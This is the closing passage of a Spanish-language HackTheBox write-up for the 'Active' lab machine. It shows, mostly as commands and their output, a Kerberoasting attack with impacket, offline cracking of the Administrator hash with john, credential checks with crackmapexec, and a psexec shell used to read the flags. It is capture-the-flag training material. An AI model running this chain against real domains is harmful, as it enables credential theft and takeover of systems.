<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs <span class="s2">"active.htb/SVC_TGS:GPPstillStandingStrong2k18"</span> <span class="nt">-dc-ip</span> 10.10.10.100 <span class="nt">-request</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-12 22:10:28.819364             



<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$533cddd55739a66c6390663f54560c71$536da9030c0fcfe56898fb14b26a99224129f8d70ede472a9d68a8cda50ddf7103d88e9d3e82879213e6881399aa363155e663f80ab390f9b9395d9d8167eb5206552d2fdd17670f5578cc44a6da52ef1da911f04af0fa652cb77df376cdaf27ddf2df147c3cdc998c338bf76aa9deea8ccc109ef941978e83ae0cc8409f64765804dda10ab0e6877733e2b2edf7ded7bb8392326f3727333ce630f848ea04a25aa1787d51ae01a33aeaf8c6c3d5d4cd0e733f43953b99b75993b90c422de8fc290f5ca41804fea76b93a4fef39e5691e63da8cff4b602b22a38f955a6160fb0e7ff85f9aac665d6e0a8cfc1602194a0914195c4a0e860d7558a4d710b5db2e9e8a6e71e940c8a33e426ec5a3ee04a8c6e2fb73e7544378bb4f71e29caa3f1ac3e6408e3ca588730116463cf7435e46ced0f7c82d4d35732b5d0df7a8a3942812adff8b51d01d3a3af53a51bb5286da83e629f9c699ac60603b60620384129fae32d9fe9a5d6e06fffccb5ac0cee924227653078632ac7950efdd9761ad362930aa66f127a538d368165660123d2f30ad709e0ca7f8a9f3f6b16a50314ccb50d1038d34a243d84f98738c7295b8f3637be871ef898232549775437508d68acbd7cbfabf88f4096aa0c79f3a18c8196cd30b861c9cd6e2c150a52d8c3f7136beadc50a734768c28c287fe21908f0e6fb4b90e21fbbfd9ddc8fa345a9d4acb26ca82bfd22243a6253dec1a6322a568b545565b99bfb40bade7088304c5879bd296c5c5f99d2eef5cc5a522a8793dff365fc3d279faacd80dc803a8400b2f0d04a21e2ceb015690302e22485296d69e5dc66b615eefde19c402f1bc4850913a1f677f7dadbe433fcbe38a5917711a50a5443c430e26bc3b4702371c56bf4413b4b89c7da880a7f62893b8a1737adfe2afb0aa1d5cc4a6e1fb5fdfbf55bcd4d658d4d4080f1853599159f00de46bc7761297fa776986888d61ee681083882cafd127390545f3624d14cf3838e5b2eddfa2f4935be0b9bb8c9404fbce1cd0dcc0feb1bfe7f03c9064b29bddb0183858c35b8b096ff6b4eca2107922d8334ba5028c80160bc167c6c9848a46f741dddb986571021edd49658d05d868502aad7292bf4ab2c87413554a79e6ae1ad3679a25101332a5b34bba01752c6df15ff7055eefcf0427cbdc9e8c7f0eca8db233c766a14391fa18c59fd3120d1ef5825d8465027fdbcbf5c6a90b094f43c97f08524a2b0dd42bf9fba2490ad8e310</span>
</code></pre></div></div>

<h2 id="bruteforce-administrator-hash">BRUTEFORCE ADMINISTRATOR HASH</h2>

<p>Capturamos el hash y lo guardamos en un archivo homonimo <code class="language-plaintext highlighter-rouge">hash</code>, luego lo rompemos con la utilidad <code class="language-plaintext highlighter-rouge">john</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs <span class="s2">"active.htb/SVC_TGS:GPPstillStandingStrong2k18"</span> <span class="nt">-dc-ip</span> 10.10.10.100 <span class="nt">-request</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1 <span class="o">&gt;</span> <span class="nb">hash</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
</code></pre></div></div>

<h2 id="granted-access-administrator-user">GRANTED ACCESS ADMINISTRATOR USER</h2>

<p>Tenemos la credencial del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, ahora vamos a validarlo por <code class="language-plaintext highlighter-rouge">smb</code> con la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> y ya obteniendo un acceso como administrador <code class="language-plaintext highlighter-rouge">Pwn3d</code>, procedemos con la utilidad <code class="language-plaintext highlighter-rouge">impacket-psexec</code> a entablar una conexión directamente con la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec <span class="s1">'active.htb/Administrator:Ticketmaster1968@10.10.10.100'</span> cmd.exe
<span class="nb">whoami</span>
</code></pre></div></div>

<h2 id="flags">FLAGS</h2>

<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:/
C:<span class="se">\&gt;</span><span class="nb">dir</span> /b/s user.txt
C:<span class="se">\U</span>sers<span class="se">\S</span>VC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
C:<span class="se">\&gt;</span><span class="nb">set</span> /P <span class="nv">user</span><span class="o">=</span>&lt;<span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\S</span><span class="s2">VC_TGS</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
C:<span class="se">\&gt;</span>echo.%user:~0,10%
0f832bb8a8
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /b/s root.txt
C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">set</span> /P <span class="nv">root</span><span class="o">=</span>&lt;<span class="s2">"C:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
echo.%root:~0,10%
aa4beed1c0
</code></pre></div></div>

<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">active</code> de HackTheBox!</p>

<p align="center">
<img src="/assets/images/active/03-finish.png" />
</p>

<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>

<p><strong>Nos vemos en otro bit.</strong></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active Directory</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#active" class="page__taxonomy-item" rel="tag">Active</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-01-18T00:00:00-05:00">January 18, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/granny/" class="pagination--pager" title="HTB granny
">Previous</a>
    
    
      <a href="/timelapse/" class="pagination--pager" title="HTB timelapse AD
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
<!--
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
-->
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" integrity="sha384-rOA1PnstxnOBLzCLMcre8ybwbTmemjzdNlILg8O7z1lUkLXozs4DHonlDtnE7fpc" crossorigin="anonymous"></script>
  







  </body>
</html>
